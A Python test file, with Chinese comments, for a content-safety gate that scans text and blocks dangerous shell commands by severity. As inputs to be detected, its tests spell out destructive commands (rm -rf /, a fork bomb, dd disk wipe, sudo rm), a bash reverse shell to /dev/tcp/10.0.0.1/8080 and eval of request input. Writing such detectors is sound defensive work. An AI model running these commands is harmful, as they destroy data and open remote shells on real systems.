# -*- coding: utf-8 -*-
"""测试: gate_g1.py —— G1 内容安全门。"""

import sys
import json
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from loop_hermes.gate_g1 import (
    scan_content, inject_g1_issues_into_state, run_gate_g1,
    CRITICAL_PATTERNS, HIGH_PATTERNS, MEDIUM_PATTERNS,
)


def _minimal_state():
    """构造最小合法 state 字典。"""
    return {
        "schema_version": 1,
        "progress": {
            "phase": "part_2_2",
            "cycle": 0,
            "convergence_counter": 0,
            "new_issues_this_round": False,
        },
        "config": {"mode": "auto", "user_request": "test"},
        "tasks": {
            "total": 0,
            "by_status": {
                "completed": 0, "in_progress": 0,
                "pending": 0, "failed": 0, "skipped": 0,
            },
        },
        "issues": {
            "active": {"p0": [], "p1": [], "p2": []},
            "resolved": {"p0": 0, "p1": 0, "p2": 0},
            "all_time": {"p0_total": 0, "p1_total": 0, "p2_total": 0},
        },
        "termination": {"status": "running"},
        "gate_state": {
            "content_safety_passed": False,
            "plan_confirmed": False,
            "file_modifications_this_cycle": 0,
            "dangerous_ops_blocked": [],
            "hermes_guardrail_events": [],
        },
    }


class TestScanContentSafe:
    """扫描安全内容应全部通过。"""

    def test_safe_python_code(self):
        """安全的 Python 代码应通过。"""
        result = scan_content("def hello(): return 'world'")
        assert result["passed"] is True
        assert result["blocked"] is False
        assert result["findings"] == []

    def test_safe_git_command(self):
        """安全的 Git 命令应通过。"""
        result = scan_content("git status\nprint('ok')")
        assert result["passed"] is True

    def test_safe_empty_content(self):
        """空内容应通过。"""
        result = scan_content("")
        assert result["passed"] is True


class TestScanContentCritical:
    """CRITICAL 模式内容应被无条件拦截。"""

    def test_rm_rf_root_blocked(self):
        """rm -rf / 应被拦截。"""
        result = scan_content("Let me run: rm -rf / to clean up")
        assert result["blocked"] is True
        assert result["passed"] is False
        assert any(f["severity"] == "CRITICAL" for f in result["findings"])

    def test_fork_bomb_blocked(self):
        """Fork bomb 应被拦截。"""
        result = scan_content(":(){ :|:& };:")
        assert result["blocked"] is True

    def test_dd_wipe_blocked(self):
        """dd 擦盘应被拦截。"""
        result = scan_content("dd if=/dev/zero of=/dev/sda bs=1M")
        assert result["blocked"] is True

    def test_reverse_shell_blocked(self):
        """反向 shell 应被拦截。"""
        result = scan_content("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
        assert result["blocked"] is True

    def test_critical_blocked_even_in_unsafe(self):
        """CRITICAL 在 unsafe 模式下也应拦截。"""
        result = scan_content("rm -rf /", mode="unsafe")
        assert result["blocked"] is True

    def test_critical_blocked_in_collaborative(self):
        """CRITICAL 在 collaborative 模式下应拦截。"""
        result = scan_content("rm -rf /", mode="collaborative")
        assert result["blocked"] is True


class TestScanContentHigh:
    """HIGH 模式内容应在 safe/auto 下拦截。"""

    def test_chmod_777_high_in_auto(self):
        """chmod 777 在 auto 模式应拦截。"""
        # 使用 /home/user 目录避免匹配 CRITICAL 的 /var 模式
        result = scan_content("chmod -R 777 /home/user/app")
        assert result["blocked"] is True

    def test_chmod_777_not_blocked_in_unsafe(self):
        """chmod 777 在 unsafe 模式不拦截（非系统目录）。"""
        result = scan_content("chmod -R 777 /home/user/app", mode="unsafe")
        assert result["blocked"] is False
        # 但仍有 findings
        assert len(result["findings"]) > 0

    def test_sudo_dangerous_high(self):
        """sudo rm 应被拦截。"""
        result = scan_content("sudo rm -rf /tmp/cache")
        assert result["blocked"] is True

    def test_eval_user_input_high(self):
        """eval 用户输入应被拦截。"""
        result = scan_content("eval(request.args.get('cmd'))")
        assert result["blocked"] is True


class TestScanContentMedium:
    """MEDIUM 模式内容仅警告不拦截。"""

    def test_os_system_warn_only(self):
        """os.system 仅警告不拦截。"""
        result = scan_content("os.system('echo hello')")
        assert result["blocked"] is False
        assert len(result["findings"]) > 0
        # 有 MEDIUM 的 findings
        assert any(f["severity"] == "MEDIUM" for f in result["findings"])


class TestInjectIssues:
    """测试 issue 注入功能。"""

    def test_inject_blocked_content_issues(self):
        """被拦截内容应注入 P0 issue。"""
        state = _minimal_state()
        scan_result = scan_content("rm -rf /")
        count = inject_g1_issues_into_state(state, scan_result)
        assert count > 0
        assert len(state["issues"]["active"]["p0"]) > 0
        assert state["progress"]["new_issues_this_round"] is True

    def test_no_inject_for_safe_content(self):
        """安全内容不注入 issue。"""
        state = _minimal_state()
        scan_result = scan_content("print('hello')")
        count = inject_g1_issues_into_state(state, scan_result)
        assert count == 0
        assert len(state["issues"]["active"]["p0"]) == 0

    def test_inject_medium_as_p2(self):
        """MEDIUM finding 应注入为 P2 issue。"""
        state = _minimal_state()
        # 构造只有 MEDIUM 的扫描结果
        scan_result = {
            "gate_id": "G1",
            "passed": True,
            "blocked": False,
            "findings": [
                {
                    "pattern_tag": "OS_SYSTEM",
                    "severity": "MEDIUM",
                    "description": "test",
                    "match_snippet": "os.system('echo')",
                }
            ],
            "timestamp": "2026-01-01T00:00:00Z",
        }
        count = inject_g1_issues_into_state(state, scan_result)
        assert count == 1
        assert len(state["issues"]["active"]["p2"]) == 1


class TestRunGateG1:
    """测试高层接口 run_gate_g1。"""

    def test_run_gate_safe_content(self):
        """安全内容完整流程。"""
        state = _minimal_state()
        result = run_gate_g1("print('hello world')", state)
        assert result["passed"] is True
        assert state["gate_state"]["content_safety_passed"] is True

    def test_run_gate_dangerous_content(self):
        """危险内容完整流程。"""
        state = _minimal_state()
        result = run_gate_g1("rm -rf / all files", state)
        assert result["blocked"] is True
        assert state["gate_state"]["content_safety_passed"] is False

    def test_run_gate_nested_in_state(self):
        """gate_state 不存在时应自动创建。"""
        state = _minimal_state()
        del state["gate_state"]
        result = run_gate_g1("ls -la", state)
        assert result["passed"] is True
        assert "gate_state" in state


class TestPatternDefinitions:
    """验证模式定义完整性。"""

    def test_critical_patterns_exist(self):
        """CRITICAL 模式列表不应为空。"""
        assert len(CRITICAL_PATTERNS) > 0

    def test_high_patterns_exist(self):
        """HIGH 模式列表不应为空。"""
        assert len(HIGH_PATTERNS) > 0

    def test_medium_patterns_exist(self):
        """MEDIUM 模式列表不应为空。"""
        assert len(MEDIUM_PATTERNS) > 0

    def test_pattern_tuples_have_correct_format(self):
        """每个 pattern 应为 (regex_str, tag, description) 三元组。"""
        for patterns in [CRITICAL_PATTERNS, HIGH_PATTERNS, MEDIUM_PATTERNS]:
            for item in patterns:
                assert len(item) == 3, f"应为三元组: {item}"
                assert isinstance(item[0], str)
                assert isinstance(item[1], str)
                assert isinstance(item[2], str)
